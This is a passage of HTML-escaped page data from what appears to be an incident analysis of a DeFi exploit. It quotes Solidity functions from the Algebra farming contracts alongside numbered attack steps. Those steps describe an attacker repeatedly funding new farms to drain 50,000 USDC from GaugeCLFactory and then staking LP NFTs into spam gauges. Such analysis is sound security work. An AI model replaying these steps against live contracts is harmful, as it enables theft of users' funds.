class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_addRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_setRewardRates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"6\"\u003e\n\u003cli\u003eIt calls the \u003ccode\u003e_receiveRewards\u003c/code\u003e function \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L411\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereentrancyLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// reentrancy lock\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"7\"\u003e\n\u003cli\u003eIt calls the \u003ccode\u003e_receiveToken\u003c/code\u003e function \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L428\"\u003ehere\u003c/a\u003e: \u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferHelper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einvalidTokenAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"8\"\u003e\n\u003cli\u003e\u003ccode\u003e1e10\u003c/code\u003e (10,000) USDC has been transferred to the new algebra farm.\u003c/li\u003e\n\u003cli\u003eAttacker repeats step 2 to 6 for 5 times to fully transfer 50,000 USDC out of the \u003ccode\u003eGaugeCLFactory\u003c/code\u003e contract.\u003c/li\u003e\n\u003cli\u003eAttacker stakes relevant LP NFT into the spam gauges through the \u003ccode\u003eGaugeCL.deposit\u003c/code\u003e function:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeposit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisNotEmergency\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonfungiblePositionManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eownerOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonfungiblePositionManager\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapproveForFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParam\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIAlgebraPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ealgebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincentiveKeys\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epoolAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardTokenAdd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eenterFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan 